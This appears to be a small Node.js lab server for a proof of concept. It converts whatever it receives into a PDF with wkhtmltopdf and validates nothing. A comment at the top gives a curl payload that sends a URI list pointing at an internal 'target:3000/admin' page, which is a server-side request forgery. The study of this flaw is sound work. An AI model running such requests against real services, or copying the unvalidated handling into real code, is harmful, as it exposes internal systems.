// payload = curl http://172.21.0.3:1337/ --header 'Content-Type: text/uri-list' -d 'http://target:3000/admin' --output test.pdf
// para realizar o PoC tenho de instalar o wkhtmltopdf
// same ips forever https://stackoverflow.com/questions/39493490/provide-static-ip-to-docker-containers-via-docker-compose

var http = require('http')
var htmlToPdf = require('wkhtmltopdf')
var conf = require('./conf.js')

http
    .createServer(acceptHtmlAndProvidePdf)
    .listen(conf.port, conf.bindIp);

function acceptHtmlAndProvidePdf(request, response) {
    console.log('Request received: ' + request);

    request.content = '';

    request.addListener("data", function (chunk) {
        if (chunk) {
            request.content += chunk;
            console.log('Content: '+request.content)
        }
    });

    request.addListener("end", function () {

        var options = {
            encoding: 'utf-8',
            pageSize: request.headers['x-page-size'] || 'Letter'
        };

        response.writeHead(200, { 'Content-Type': 'application/pdf' });

        htmlToPdf(request.content, options)
            .pipe(response);

        console.log('Processed HTML to PDF: ' + response.headers);
    });
}

console.log('Server running at http://' + conf.bindIp + ':' + conf.port + '/');
